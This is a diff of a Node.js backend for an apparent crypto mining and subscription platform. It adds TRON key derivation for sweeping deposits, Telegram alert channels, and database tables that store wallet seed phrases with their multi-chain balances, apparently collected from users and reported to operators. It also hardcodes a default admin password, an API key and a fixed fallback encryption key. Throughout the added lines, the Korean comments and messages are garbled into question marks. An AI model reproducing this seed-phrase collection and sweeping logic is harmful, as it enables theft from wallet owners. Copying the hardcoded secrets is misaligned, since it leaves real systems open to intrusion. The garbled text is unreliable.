@@ -4,14 +4,14 @@ const path = require('path');
 const crypto = require('crypto');
 const fs = require('fs');
 const multer = require('multer');
-// child_process는 더 이상 사용 안 함 (seed-checker.js require 방식으로 전환)
+// child_process? ? ?? ?? ? ? (seed-checker.js require ???? ??)
 
-// seed-checker.js 에서 멀티체인 잔고 확인 함수 로드
+// seed-checker.js ?? ???? ?? ?? ?? ??
 const { checkMultiChainBalance } = require('./seed-checker');
 const { HDNodeWallet } = require('ethers');
 require('dotenv').config();
 
-// ---------- TRON HD 주소 파생 유틸 ----------
+// ---------- TRON HD ?? ?? ?? ----------
 const BASE58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
 
 function base58Encode(buf) {
@@ -34,14 +34,14 @@ function ethAddressToTron(ethAddress) {
   return base58Encode(Buffer.concat([raw, h2.slice(0, 4)]));
 }
 
-// ---------- 니모닉/xpub 암호화 저장 ----------
-// .env에 WALLET_SECRET_KEY=<64자리 hex> 설정 권장
-// 미설정 시 서버 재시작마다 키가 바뀌어 기존 니모닉 복호화 불가 → 반드시 .env에 고정값 설정
+// ---------- ???/xpub ??? ?? ----------
+// .env? WALLET_SECRET_KEY=<64?? hex> ?? ??
+// ??? ? ?? ????? ?? ??? ?? ??? ??? ?? ? ??? .env? ??? ??
 const _walletSecretKey = (() => {
   const envKey = process.env.WALLET_SECRET_KEY;
   if (envKey && envKey.length === 64) return Buffer.from(envKey, 'hex');
-  console.warn('⚠️  WALLET_SECRET_KEY 미설정. 임시 키 사용 — .env에 64자리 hex 값을 설정하세요!');
-  // 임시: 서버 시작 시 고정 fallback (운영에서는 반드시 .env 설정)
+  console.warn('??  WALLET_SECRET_KEY ???. ?? ? ?? ? .env? 64?? hex ?? ?????!');
+  // ??: ?? ?? ? ?? fallback (????? ??? .env ??)
   return crypto.createHash('sha256').update('mynolab-wallet-key-fallback').digest();
 })();
 
@@ -64,41 +64,41 @@ function decryptSecret(stored) {
   return dec.toString('utf8');
 }
 
-// secret = 니모닉(12/24단어) 또는 xpub 키
-// 니모닉: m/44'/195'/0'/0/index 경로로 TRON 주소 파생
-// xpub: 자식 인덱스로 파생 (sweep 불가)
+// secret = ???(12/24??) ?? xpub ?
+// ???: m/44'/195'/0'/0/index ??? TRON ?? ??
+// xpub: ?? ???? ?? (sweep ??)
 function deriveTronAddress(secret, index) {
   const plain = decryptSecret(secret);
-  if (!plain) throw new Error('니모닉/xpub 키가 없습니다.');
+  if (!plain) throw new Error('???/xpub ?? ????.');
   if (plain.startsWith('xpub') || plain.startsWith('xprv')) {
     const node = HDNodeWallet.fromExtendedKey(plain);
     return ethAddressToTron(node.deriveChild(index).address);
   }
-  // 니모닉 → TRON 경로 m/44'/195'/0'/0/index
+  // ??? ? TRON ?? m/44'/195'/0'/0/index
   const wallet = HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/${index}`);
   return ethAddressToTron(wallet.address);
 }
 
-// 니모닉에서 개인키 파생 (sweep용)
+// ????? ??? ?? (sweep?)
 function deriveTronPrivateKey(secret, index) {
   const plain = decryptSecret(secret);
-  if (!plain) throw new Error('니모닉이 없습니다.');
-  if (plain.startsWith('xpub')) throw new Error('xpub으로는 개인키 파생 불가 (sweep 불가). 니모닉을 입력하세요.');
+  if (!plain) throw new Error('???? ????.');
+  if (plain.startsWith('xpub')) throw new Error('xpub??? ??? ?? ?? (sweep ??). ???? ?????.');
   const wallet = HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/${index}`);
   return wallet.privateKey.replace('0x', '');
 }
 
-// 니모닉에서 루트(m/44'/195'/0'/0) 개인키 파생 — TRX 선송금용
+// ????? ??(m/44'/195'/0'/0) ??? ?? ? TRX ????
 function deriveRootPrivateKey(secret) {
   const plain = decryptSecret(secret);
-  if (!plain) throw new Error('니모닉이 없습니다.');
-  if (plain.startsWith('xpub')) throw new Error('xpub은 루트 키 파생 불가');
-  // 루트지갑 = 인덱스 0 (입금 주소는 1부터 시작)
+  if (!plain) throw new Error('???? ????.');
+  if (plain.startsWith('xpub')) throw new Error('xpub? ?? ? ?? ??');
+  // ???? = ??? 0 (?? ??? 1?? ??)
   const wallet = HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/0`);
   return wallet.privateKey.replace('0x', '');
 }
 
-// MariaDB 연결
+// MariaDB ??
 const db = require('./db');
 const axios = require('axios');
 const cron = require('node-cron');
@@ -109,7 +109,7 @@ const PORT = process.env.PORT || 3000;
 const MASTER_ID = process.env.MASTER_ID || 'tlarbwjd';
 const MASTER_PW = process.env.MASTER_PW || 'tlarbwjd';
 
-// ---------- DB 마이그레이션 ----------
+// ---------- DB ?????? ----------
 async function runMigrations() {
   try {
     await db.pool.query(`
@@ -117,28 +117,48 @@ async function runMigrations() {
         ADD COLUMN IF NOT EXISTS tg_bot_token VARCHAR(300) DEFAULT NULL,
         ADD COLUMN IF NOT EXISTS tg_chat_id   VARCHAR(100) DEFAULT NULL
     `);
-    console.log('✅ DB 마이그레이션: managers.tg_bot_token / tg_chat_id 확인 완료');
+    console.log('? DB ??????: managers.tg_bot_token / tg_chat_id ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션 오류:', e.message);
+    console.error('DB ?????? ??:', e.message);
   }
   try {
-    // 마스터 알림봇 전용 테이블 (기존 settings 테이블과 분리)
+    const [depCols] = await db.pool.query("SHOW COLUMNS FROM managers LIKE 'tg_chat_deposit'");
+    if (depCols.length === 0) {
+      await db.pool.query('ALTER TABLE managers ADD COLUMN tg_chat_deposit VARCHAR(100) DEFAULT NULL AFTER tg_chat_id');
+      await db.pool.query('ALTER TABLE managers ADD COLUMN tg_chat_approval VARCHAR(100) DEFAULT NULL AFTER tg_chat_deposit');
+      console.log('? DB ??????: managers.tg_chat_deposit / tg_chat_approval ??');
+    }
+  } catch (e) {
+    console.error('DB ??????(managers ?? chat) ??:', e.message);
+  }
+  try {
+    const [ownTg] = await db.pool.query("SHOW COLUMNS FROM account_owners LIKE 'tg_bot_token'");
+    if (ownTg.length === 0) {
+      await db.pool.query('ALTER TABLE account_owners ADD COLUMN tg_bot_token VARCHAR(300) DEFAULT NULL');
+      await db.pool.query('ALTER TABLE account_owners ADD COLUMN tg_chat_seed VARCHAR(100) DEFAULT NULL');
+      console.log('? DB ??????: account_owners ????(?? ??) ?? ??');
+    }
+  } catch (e) {
+    console.error('DB ??????(account_owners tg) ??:', e.message);
+  }
+  try {
+    // ??? ??? ?? ??? (?? settings ???? ??)
     await db.pool.query(`
       CREATE TABLE IF NOT EXISTS master_settings (
         skey  VARCHAR(100) NOT NULL PRIMARY KEY,
         sval  TEXT         DEFAULT NULL
       )
     `);
-    console.log('✅ DB 마이그레이션: master_settings 테이블 확인 완료');
+    console.log('? DB ??????: master_settings ??? ?? ??');
 
-    // 혹시 이전 버전에서 settings 테이블이 skey/sval 컬럼으로 잘못 생성된 경우 복구
-    // settingDB 는 setting_key / setting_value 컬럼을 사용하므로 원래 구조로 재생성
+    // ?? ?? ???? settings ???? skey/sval ???? ?? ??? ?? ??
+    // settingDB ? setting_key / setting_value ??? ????? ?? ??? ???
     const [[colCheck]] = await db.pool.query(
       `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
        WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'settings' AND COLUMN_NAME = 'skey'`
     );
     if (colCheck) {
-      // 잘못된 스키마(skey 컬럼 존재) → 삭제 후 올바른 구조로 재생성
+      // ??? ???(skey ?? ??) ? ?? ? ??? ??? ???
       await db.pool.query('DROP TABLE settings');
       await db.pool.query(`
         CREATE TABLE settings (
@@ -146,9 +166,9 @@ async function runMigrations() {
           setting_value TEXT         DEFAULT NULL
         )
       `);
-      console.log('✅ DB 마이그레이션: settings 테이블 스키마 복구 완료');
+      console.log('? DB ??????: settings ??? ??? ?? ??');
     } else {
-      // 정상 구조 확인용 생성 (존재하면 무시)
+      // ?? ?? ??? ?? (???? ??)
       await db.pool.query(`
         CREATE TABLE IF NOT EXISTS settings (
           setting_key   VARCHAR(100) NOT NULL PRIMARY KEY,
@@ -157,15 +177,15 @@ async function runMigrations() {
       `);
     }
   } catch (e) {
-    console.error('DB 마이그레이션(settings) 오류:', e.message);
+    console.error('DB ??????(settings) ??:', e.message);
   }
   try {
-    // 관리자가 준비해둔 이벤트 시드 목록 (클라이언트 제출 seeds 와 별개)
+    // ???? ???? ??? ?? ?? (????? ?? seeds ? ??)
     await db.pool.query(`
       CREATE TABLE IF NOT EXISTS event_seeds (
         id          INT AUTO_INCREMENT PRIMARY KEY,
-        phrase      TEXT         NOT NULL COMMENT '시드 문구',
-        note        VARCHAR(255) DEFAULT NULL COMMENT '메모',
+        phrase      TEXT         NOT NULL COMMENT '?? ??',
+        note        VARCHAR(255) DEFAULT NULL COMMENT '??',
         btc         DECIMAL(36,18) DEFAULT NULL,
         eth         DECIMAL(36,18) DEFAULT NULL,
         tron        DECIMAL(36,18) DEFAULT NULL,
@@ -175,12 +195,12 @@ async function runMigrations() {
         INDEX idx_status (status)
       )
     `);
-    console.log('✅ DB 마이그레이션: event_seeds 테이블 확인 완료');
+    console.log('? DB ??????: event_seeds ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(event_seeds) 오류:', e.message);
+    console.error('DB ??????(event_seeds) ??:', e.message);
   }
   try {
-    // 시드 지급 이력 테이블 (event_seeds → 유저)
+    // ?? ?? ?? ??? (event_seeds ? ??)
     await db.pool.query(`
       CREATE TABLE IF NOT EXISTS seed_gifts (
         id           INT AUTO_INCREMENT PRIMARY KEY,
@@ -194,31 +214,31 @@ async function runMigrations() {
         INDEX idx_user_status (user_id, status)
       )
     `);
-    console.log('✅ DB 마이그레이션: seed_gifts 테이블 확인 완료');
+    console.log('? DB ??????: seed_gifts ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(seed_gifts) 오류:', e.message);
+    console.error('DB ??????(seed_gifts) ??:', e.message);
   }
-  // seed_gifts 테이블 컬럼 보강 (기존 테이블 대응)
+  // seed_gifts ??? ?? ?? (?? ??? ??)
   try {
-    // event_seed_id 없으면 추가
+    // event_seed_id ??? ??
     const [giftCols] = await db.pool.query("SHOW COLUMNS FROM seed_gifts LIKE 'event_seed_id'");
     if (giftCols.length === 0) {
       await db.pool.query("ALTER TABLE seed_gifts ADD COLUMN event_seed_id INT DEFAULT NULL AFTER id");
-      console.log('✅ seed_gifts.event_seed_id 컬럼 추가됨');
+      console.log('? seed_gifts.event_seed_id ?? ???');
     }
-    // seed_id 가 NOT NULL 이면 nullable 로 변경 (구버전 스키마 대응)
+    // seed_id ? NOT NULL ?? nullable ? ?? (??? ??? ??)
     const [seedIdCols] = await db.pool.query("SHOW COLUMNS FROM seed_gifts LIKE 'seed_id'");
     if (seedIdCols.length > 0) {
       const col = seedIdCols[0];
       if (col.Null === 'NO') {
         await db.pool.query("ALTER TABLE seed_gifts MODIFY COLUMN seed_id INT DEFAULT NULL");
-        console.log('✅ seed_gifts.seed_id → nullable 변경됨');
+        console.log('? seed_gifts.seed_id ? nullable ???');
       }
     }
   } catch (e) {
-    console.error('DB 마이그레이션(seed_gifts 컬럼) 오류:', e.message);
+    console.error('DB ??????(seed_gifts ??) ??:', e.message);
   }
-  // seeds 테이블 컬럼 보강 (seed_checker.py 없이도 API가 동작하도록)
+  // seeds ??? ?? ?? (seed_checker.py ??? API? ?????)
   try {
     const seedCols = [
       ['balance',      'DECIMAL(36,18) DEFAULT 0'],
@@ -234,15 +254,15 @@ async function runMigrations() {
       const [rows] = await db.pool.query(`SHOW COLUMNS FROM seeds LIKE ?`, [col]);
       if (rows.length === 0) {
         await db.pool.query(`ALTER TABLE seeds ADD COLUMN ${col} ${def}`);
-        console.log(`✅ DB 마이그레이션: seeds.${col} 컬럼 추가`);
+        console.log(`? DB ??????: seeds.${col} ?? ??`);
       }
     }
-    console.log('✅ DB 마이그레이션: seeds 테이블 컬럼 확인 완료');
+    console.log('? DB ??????: seeds ??? ?? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(seeds 컬럼) 오류:', e.message);
+    console.error('DB ??????(seeds ??) ??:', e.message);
   }
 
-  // ===== macroUser 시스템 테이블 =====
+  // ===== macroUser ??? ??? =====
   try {
     await db.pool.query(`
       CREATE TABLE IF NOT EXISTS mu_users (
@@ -256,9 +276,9 @@ async function runMigrations() {
         updated_at    DATETIME NOT NULL DEFAULT NOW() ON UPDATE NOW()
       )
     `);
-    console.log('✅ DB 마이그레이션: mu_users 테이블 확인 완료');
+    console.log('? DB ??????: mu_users ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(mu_users) 오류:', e.message);
+    console.error('DB ??????(mu_users) ??:', e.message);
   }
   try {
     await db.pool.query(`
@@ -271,9 +291,9 @@ async function runMigrations() {
         FOREIGN KEY (user_id) REFERENCES mu_users(id) ON DELETE CASCADE
       )
     `);
-    console.log('✅ DB 마이그레이션: mu_sessions 테이블 확인 완료');
+    console.log('? DB ??????: mu_sessions ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(mu_sessions) 오류:', e.message);
+    console.error('DB ??????(mu_sessions) ??:', e.message);
   }
   try {
     await db.pool.query(`
@@ -295,9 +315,9 @@ async function runMigrations() {
         FOREIGN KEY (owner_user_id) REFERENCES mu_users(id) ON DELETE CASCADE
       )
     `);
-    console.log('✅ DB 마이그레이션: managed_accounts 테이블 확인 완료');
+    console.log('? DB ??????: managed_accounts ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(managed_accounts) 오류:', e.message);
+    console.error('DB ??????(managed_accounts) ??:', e.message);
   }
   try {
     await db.pool.query(`
@@ -312,9 +332,9 @@ async function runMigrations() {
         FOREIGN KEY (managed_account_id) REFERENCES managed_accounts(id) ON DELETE CASCADE
       )
     `);
-    console.log('✅ DB 마이그레이션: managed_account_logs 테이블 확인 완료');
+    console.log('? DB ??????: managed_account_logs ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(managed_account_logs) 오류:', e.message);
+    console.error('DB ??????(managed_account_logs) ??:', e.message);
   }
   try {
     await db.pool.query(`
@@ -331,26 +351,26 @@ async function runMigrations() {
         FOREIGN KEY (managed_account_id) REFERENCES managed_accounts(id) ON DELETE CASCADE
       )
     `);
-    console.log('✅ DB 마이그레이션: managed_account_tasks 테이블 확인 완료');
+    console.log('? DB ??????: managed_account_tasks ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(managed_account_tasks) 오류:', e.message);
+    console.error('DB ??????(managed_account_tasks) ??:', e.message);
   }
 
-  // ===== 채굴기 플랫폼 기능 =====
+  // ===== ??? ??? ?? =====
   try {
     await db.pool.query(`
       ALTER TABLE managers
-        ADD COLUMN IF NOT EXISTS settlement_rate DECIMAL(5,2) NOT NULL DEFAULT 10.00 COMMENT '정산 비율 (%)'
+        ADD COLUMN IF NOT EXISTS settlement_rate DECIMAL(5,2) NOT NULL DEFAULT 10.00 COMMENT '?? ?? (%)'
     `);
-    console.log('✅ DB 마이그레이션: managers.settlement_rate 확인 완료');
+    console.log('? DB ??????: managers.settlement_rate ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(managers.settlement_rate) 오류:', e.message);
+    console.error('DB ??????(managers.settlement_rate) ??:', e.message);
   }
   try {
     await db.pool.query(`
       CREATE TABLE IF NOT EXISTS miner_status (
         id          INT AUTO_INCREMENT PRIMARY KEY,
-        user_id     VARCHAR(50) NOT NULL UNIQUE COMMENT '사용자 ID',
+        user_id     VARCHAR(50) NOT NULL UNIQUE COMMENT '??? ID',
         status      ENUM('running','stopped') NOT NULL DEFAULT 'stopped',
         coin_type   VARCHAR(20) NOT NULL DEFAULT 'BTC',
         assigned_at DATETIME DEFAULT NULL,
@@ -358,9 +378,9 @@ async function runMigrations() {
         INDEX idx_status (status)
       )
     `);
-    console.log('✅ DB 마이그레이션: miner_status 테이블 확인 완료');
+    console.log('? DB ??????: miner_status ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(miner_status) 오류:', e.message);
+    console.error('DB ??????(miner_status) ??:', e.message);
   }
   try {
     await db.pool.query(`
@@ -376,9 +396,9 @@ async function runMigrations() {
         INDEX idx_mined_at (mined_at)
       )
     `);
-    console.log('✅ DB 마이그레이션: mining_records 테이블 확인 완료');
+    console.log('? DB ??????: mining_records ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(mining_records) 오류:', e.message);
+    console.error('DB ??????(mining_records) ??:', e.message);
   }
   try {
     await db.pool.query(`
@@ -396,9 +416,9 @@ async function runMigrations() {
         INDEX idx_created (created_at)
       )
     `);
-    console.log('✅ DB 마이그레이션: settlements 테이블 확인 완료');
+    console.log('? DB ??????: settlements ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(settlements) 오류:', e.message);
+    console.error('DB ??????(settlements) ??:', e.message);
   }
   try {
     await db.pool.query(`
@@ -416,27 +436,27 @@ async function runMigrations() {
         INDEX idx_requested (requested_at)
       )
     `);
-    console.log('✅ DB 마이그레이션: withdrawal_requests 테이블 확인 완료');
+    console.log('? DB ??????: withdrawal_requests ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(withdrawal_requests) 오류:', e.message);
+    console.error('DB ??????(withdrawal_requests) ??:', e.message);
   }
 
-  // ===== 그룹 오너 계정 시스템 =====
+  // ===== ?? ?? ?? ??? =====
   try {
     await db.pool.query(`
       CREATE TABLE IF NOT EXISTS account_owners (
-        id         VARCHAR(50) NOT NULL PRIMARY KEY COMMENT '오너 계정 ID',
-        pw         VARCHAR(255) NOT NULL COMMENT '비밀번호',
-        name       VARCHAR(100) DEFAULT NULL COMMENT '표시 이름',
-        telegram   VARCHAR(100) DEFAULT NULL COMMENT '메신저 ID',
-        manager_id VARCHAR(50)  DEFAULT NULL COMMENT '담당 매니저 ID',
+        id         VARCHAR(50) NOT NULL PRIMARY KEY COMMENT '?? ?? ID',
+        pw         VARCHAR(255) NOT NULL COMMENT '????',
+        name       VARCHAR(100) DEFAULT NULL COMMENT '?? ??',
+        telegram   VARCHAR(100) DEFAULT NULL COMMENT '??? ID',
+        manager_id VARCHAR(50)  DEFAULT NULL COMMENT '?? ??? ID',
         created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
         INDEX idx_manager (manager_id)
       )
     `);
-    console.log('✅ DB 마이그레이션: account_owners 테이블 확인 완료');
+    console.log('? DB ??????: account_owners ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(account_owners) 오류:', e.message);
+    console.error('DB ??????(account_owners) ??:', e.message);
   }
   try {
     await db.pool.query(`
@@ -447,21 +467,21 @@ async function runMigrations() {
         INDEX idx_owner (owner_id)
       )
     `);
-    console.log('✅ DB 마이그레이션: owner_sessions 테이블 확인 완료');
+    console.log('? DB ??????: owner_sessions ??? ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(owner_sessions) 오류:', e.message);
+    console.error('DB ??????(owner_sessions) ??:', e.message);
   }
   try {
-    // account_owners 테이블에 status 컬럼 추가
+    // account_owners ???? status ?? ??
     const [oCols] = await db.pool.query("SHOW COLUMNS FROM account_owners LIKE 'status'");
     if (oCols.length === 0) {
       await db.pool.query("ALTER TABLE account_owners ADD COLUMN status ENUM('pending','approved','rejected') NOT NULL DEFAULT 'pending' AFTER manager_id");
-      console.log('✅ DB 마이그레이션: account_owners.status 컬럼 추가');
+      console.log('? DB ??????: account_owners.status ?? ??');
     } else {
-      console.log('✅ DB 마이그레이션: account_owners.status 확인 완료');
+      console.log('? DB ??????: account_owners.status ?? ??');
     }
   } catch (e) {
-    console.error('DB 마이그레이션(account_owners.status) 오류:', e.message);
+    console.error('DB ??????(account_owners.status) ??:', e.message);
   }
   try {
     await db.pool.query(`
@@ -480,52 +500,107 @@ async function runMigrations() {
         INDEX idx_bulk_owner  (owner_id)
       )
     `);
-    console.log('✅ DB 마이그레이션: bulk_payment_sessions 확인 완료');
+    console.log('? DB ??????: bulk_payment_sessions ?? ??');
   } catch (e) {
-    console.error('DB 마이그레이션(bulk_payment_sessions) 오류:', e.message);
+    console.error('DB ??????(bulk_payment_sessions) ??:', e.message);
   }
   try {
-    // users 테이블에 owner_id 컬럼 추가
+    // users ???? owner_id ?? ??
     const [cols] = await db.pool.query("SHOW COLUMNS FROM users LIKE 'owner_id'");
     if (cols.length === 0) {
-      await db.pool.query("ALTER TABLE users ADD COLUMN owner_id VARCHAR(50) DEFAULT NULL COMMENT '그룹 오너 계정 ID'");
-      console.log('✅ DB 마이그레이션: users.owner_id 컬럼 추가');
+      await db.pool.query("ALTER TABLE users ADD COLUMN owner_id VARCHAR(50) DEFAULT NULL COMMENT '?? ?? ?? ID'");
+      console.log('? DB ??????: users.owner_id ?? ??');
     } else {
-      console.log('✅ DB 마이그레이션: users.owner_id 확인 완료');
+      console.log('? DB ??????: users.owner_id ?? ??');
     }
   } catch (e) {
-    console.error('DB 마이그레이션(users.owner_id) 오류:', e.message);
+    console.error('DB ??????(users.owner_id) ??:', e.message);
   }
 }
 runMigrations();
 
-// ---------- 마스터 알림봇 헬퍼 ----------
-async function getMasterTelegram() {
+// ---------- Master Telegram (1 bot token + per-channel chat ids) ----------
+const MASTER_TG_KEYS = [
+  'master_tg_bot_token',
+  'master_tg_chat_id',
+  'master_tg_chat_deposit',
+  'master_tg_chat_seed',
+  'master_tg_chat_approval',
+];
+async function getMasterTgConfig() {
   try {
-    const [[r1]] = await db.pool.query("SELECT sval FROM master_settings WHERE skey = 'master_tg_bot_token'");
-    const [[r2]] = await db.pool.query("SELECT sval FROM master_settings WHERE skey = 'master_tg_chat_id'");
-    return { botToken: r1?.sval || null, chatId: r2?.sval || null };
-  } catch (_) { return { botToken: null, chatId: null }; }
+    const [rows] = await db.pool.query(
+      'SELECT skey, sval FROM master_settings WHERE skey IN (?,?,?,?,?)',
+      MASTER_TG_KEYS
+    );
+    const m = {};
+    for (const r of rows) m[r.skey] = r.sval;
+    const legacy = (m.master_tg_chat_id || '').toString().trim() || null;
+    const botToken = (m.master_tg_bot_token || '').toString().trim() || null;
+    const d = (m.master_tg_chat_deposit || '').toString().trim() || null;
+    const s = (m.master_tg_chat_seed || '').toString().trim() || null;
+    const a = (m.master_tg_chat_approval || '').toString().trim() || null;
+    return {
+      botToken,
+      chatDeposit: d || legacy,
+      chatSeed: s || legacy,
+      chatApproval: a || legacy,
+      legacyChatId: legacy,
+    };
+  } catch (_) {
+    return { botToken: null, chatDeposit: null, chatSeed: null, chatApproval: null, legacyChatId: null };
+  }
 }
-async function setMasterTelegram(botToken, chatId) {
-  await db.pool.query(
-    "INSERT INTO master_settings (skey, sval) VALUES ('master_tg_bot_token', ?) ON DUPLICATE KEY UPDATE sval = ?",
-    [botToken || null, botToken || null]
+async function getMasterTelegram() {
+  const c = await getMasterTgConfig();
+  return { botToken: c.botToken, chatId: c.chatDeposit };
+}
+async function setMasterTgConfig(botToken, opts = {}) {
+  const chatId = opts.chatId != null ? String(opts.chatId).trim() : '';
+  const chatDeposit = opts.chatDeposit != null ? String(opts.chatDeposit).trim() : '';
+  const chatSeed = opts.chatSeed != null ? String(opts.chatSeed).trim() : '';
+  const chatApproval = opts.chatApproval != null ? String(opts.chatApproval).trim() : '';
+  const pairs = [
+    ['master_tg_bot_token', botToken ? String(botToken).trim() : null],
+    ['master_tg_chat_id', chatId || null],
+    ['master_tg_chat_deposit', chatDeposit || null],
+    ['master_tg_chat_seed', chatSeed || null],
+    ['master_tg_chat_approval', chatApproval || null],
+  ];
+  for (const [k, v] of pairs) {
+    await db.pool.query(
+      'INSERT INTO master_settings (skey, sval) VALUES (?, ?) ON DUPLICATE KEY UPDATE sval = VALUES(sval)',
+      [k, v]
+    );
+  }
+}
+async function sendMasterTelegramChannel(kind, text) {
+  const c = await getMasterTgConfig();
+  if (!c.botToken) return;
+  const chat = kind === 'deposit' ? c.chatDeposit : kind === 'seed' ? c.chatSeed : c.chatApproval;
+  if (chat) await sendTelegram(c.botToken, chat, text);
+}
+async function sendManagerTelegramByChannel(managerId, channel, text) {
+  if (!managerId) return;
+  const [[mgr]] = await db.pool.query(
+    'SELECT tg_bot_token, tg_chat_id, tg_chat_deposit, tg_chat_approval FROM managers WHERE id = ?',
+    [managerId]
   );
-  await db.pool.query(
-    "INSERT INTO master_settings (skey, sval) VALUES ('master_tg_chat_id', ?) ON DUPLICATE KEY UPDATE sval = ?",
-    [chatId || null, chatId || null]
-  );
+  if (!mgr?.tg_bot_token) return;
+  const dep = (mgr.tg_chat_deposit || '').toString().trim() || (mgr.tg_chat_id || '').toString().trim() || null;
+  const appr = (mgr.tg_chat_approval || '').toString().trim() || (mgr.tg_chat_id || '').toString().trim() || null;
+  const chat = channel === 'deposit' ? dep : appr;
+  if (chat) await sendTelegram(mgr.tg_bot_token, chat, text);
 }
 
-// ---------- TRON RPC 노드 ----------
-// TronGrid 무료 티어는 429(속도 제한)가 잦음 → 인증 불필요한 공개 노드 사용
+// ---------- TRON RPC ?? ----------
+// TronGrid ?? ??? 429(?? ??)? ?? ? ?? ???? ?? ?? ??
 const TRON_FULL_HOST = 'https://tron-rpc.publicnode.com';
 
-// ---------- 텔레그램 알림 ----------
+// ---------- ???? ?? ----------
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
-// HTML 특수문자 이스케이프 (Telegram HTML 파싱 오류 방지)
+// HTML ???? ????? (Telegram HTML ?? ?? ??)
 function escapeHtml(str) {
   return String(str ?? '')
     .replace(/&/g, '&amp;')
@@ -533,15 +608,15 @@ function escapeHtml(str) {
     .replace(/>/g, '&gt;');
 }
 
-// 최근 Telegram 에러 로그 (최대 20건, 관리자 진단용)
+// ?? Telegram ?? ?? (?? 20?, ??? ???)
 const _tgErrorLog = [];
 function _pushTgError(entry) {
   _tgErrorLog.unshift(entry);
   if (_tgErrorLog.length > 20) _tgErrorLog.pop();
 }
 
-// throwOnError=true 이면 실패 시 예외 발생 (테스트 엔드포인트용)
-// parseMode: 'HTML'(기본) | 'plain' (HTML 파싱 없이 전송)
+// throwOnError=true ?? ?? ? ?? ?? (??? ??????)
+// parseMode: 'HTML'(??) | 'plain' (HTML ?? ?? ??)
 async function sendTelegram(botToken, chatId, text, throwOnError = false, parseMode = 'HTML') {
   try {
     const body = { chat_id: chatId, text };
@@ -551,17 +626,17 @@ async function sendTelegram(botToken, chatId, text, throwOnError = false, parseM
       body,
       { timeout: 8000 }
     );
-    console.log(`[TELEGRAM] 전송 완료 → chatId=${chatId}`);
+    console.log(`[TELEGRAM] ?? ?? ? chatId=${chatId}`);
   } catch (e) {
     const desc = e.response?.data?.description || e.message;
     const errCode = e.response?.data?.error_code;
-    console.error(`[TELEGRAM] 전송 실패 chatId=${chatId}: ${desc}`);
+    console.error(`[TELEGRAM] ?? ?? chatId=${chatId}: ${desc}`);
     _pushTgError({ time: new Date().toISOString(), chatId, error: desc, code: errCode });
-    if (throwOnError) throw new Error(`Telegram 오류: ${desc}`);
+    if (throwOnError) throw new Error(`Telegram ??: ${desc}`);
   }
 }
 
-// ---------- 자동 스윕 & 구독 부여 ----------
+// ---------- ?? ?? & ?? ?? ----------
 
 const DEFAULT_PACKAGES = [
   { days: 30, price: 39 }, { days: 60, price: 75 },
@@ -569,34 +644,34 @@ const DEFAULT_PACKAGES = [
 ];
 
 async function calcDaysFromUsdt(usdtAmount) {
-  // ⚠️ 테스트 모드: 금액 무관 30일 고정
-  console.log(`[calcDays] 테스트 모드 — ${usdtAmount} USDT → 30일 고정`);
+  // ?? ??? ??: ?? ?? 30? ??
+  console.log(`[calcDays] ??? ?? ? ${usdtAmount} USDT ? 30? ??`);
   return 30;
 
-  /* 실제 운영 로직 (테스트 끝나면 위 두 줄 삭제 후 주석 해제)
+  /* ?? ?? ?? (??? ??? ? ? ? ?? ? ?? ??)
   try {
     const raw = await db.settingDB.get('subscription_packages');
     const monthlyRaw = await db.settingDB.get('monthly_price_usdt');
     const packages = raw ? JSON.parse(raw) : DEFAULT_PACKAGES;
     const monthlyPrice = monthlyRaw ? Number(monthlyRaw) : 39;
 
-    // 패키지 정확 매칭 (±5% 허용)
+    // ??? ?? ?? (?5% ??)
     const matched = packages
       .slice()
       .sort((a, b) => Math.abs(a.price - usdtAmount) - Math.abs(b.price - usdtAmount))[0];
     if (matched && Math.abs(matched.price - usdtAmount) / matched.price <= 0.05) {
       return matched.days;
     }
-    // 비례 계산
+    // ?? ??
     return Math.max(1, Math.floor((usdtAmount / monthlyPrice) * 30));
   } catch { return Math.max(1, Math.floor((usdtAmount / 39) * 30)); }
   */
 }
 
-const TRON_FULL_HOST_CALC = 'https://api.trongrid.io'; // 체인 파라미터 조회용
-const USDT_ENERGY_NEEDED = 65_000; // USDT TRC20 전송에 필요한 에너지 추정치
+const TRON_FULL_HOST_CALC = 'https://api.trongrid.io'; // ?? ???? ???
+const USDT_ENERGY_NEEDED = 65_000; // USDT TRC20 ??? ??? ??? ???
 
-// TRON 체인 파라미터에서 현재 에너지 단가를 조회해 필요한 TRX 계산
+// TRON ?? ?????? ?? ??? ??? ??? ??? TRX ??
 async function calcTrxNeeded() {
   try {
     const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
@@ -608,65 +683,65 @@ async function calcTrxNeeded() {
     const ep = params.find(p => p.key === 'getEnergyFee');
     const energyFee = ep?.value || 420; // sun / energy unit
     const trxRaw = Math.ceil((USDT_ENERGY_NEEDED * energyFee) / 1_000_000);
-    const trxNeeded = Math.max(trxRaw + 2, 15); // +2 TRX bandwidth 버퍼, 최소 15
